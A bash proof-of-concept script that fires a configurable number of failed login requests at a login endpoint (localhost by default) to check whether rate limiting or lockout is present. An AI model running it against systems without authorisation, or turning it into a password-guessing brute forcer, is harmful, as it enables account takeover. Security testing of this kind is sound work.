#!/bin/bash

# POC: Brute Force Attack - Missing Rate Limiting on Login Endpoint
# This script demonstrates that the login endpoint accepts unlimited failed attempts
# without any rate limiting, account lockout, or progressive delays

TARGET_URL="${1:-http://localhost:8080/api/login.php}"
USERNAME="${2:-admin}"
ATTEMPTS="${3:-20}"

echo "[*] Testing brute force protection on: $TARGET_URL"
echo "[*] Target username: $USERNAME"
echo "[*] Number of attempts: $ATTEMPTS"
echo ""
echo "[*] Sending $ATTEMPTS rapid-fire login attempts with wrong password..."
echo ""

attempt_count=0
success_count=0
error_count=0
rate_limit_count=0

for i in $(seq 1 $ATTEMPTS); do
  response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
    -d "username=$USERNAME&password=wrongpass_$i" \
    -H "Content-Type: application/x-www-form-urlencoded")
  
  http_code=$(echo "$response" | tail -n1)
  body=$(echo "$response" | head -n-1)
  
  attempt_count=$((attempt_count + 1))
  
  # Check for rate limiting responses
  if [ "$http_code" = "429" ] || [ "$http_code" = "403" ]; then
    rate_limit_count=$((rate_limit_count + 1))
    echo "Attempt $i: HTTP $http_code - Rate limit detected!"
  elif [ "$http_code" = "200" ]; then
    success_count=$((success_count + 1))
    if [ $i -eq 1 ] || [ $i -eq $ATTEMPTS ]; then
      echo "Attempt $i: HTTP $http_code - Response: $body"
    fi
  else
    error_count=$((error_count + 1))
    echo "Attempt $i: HTTP $http_code"
  fi
done

echo ""
echo "====== RESULTS ======"
echo "Total attempts sent: $attempt_count"
echo "Successful responses (HTTP 200): $success_count"
echo "Rate limit responses (HTTP 429/403): $rate_limit_count"
echo "Other errors: $error_count"
echo ""

if [ $rate_limit_count -eq 0 ]; then
  echo "[!] VULNERABILITY CONFIRMED: No rate limiting detected!"
  echo "[!] All $attempt_count attempts were accepted without throttling"
  exit 0
else
  echo "[+] Rate limiting appears to be in place"
  exit 1
fi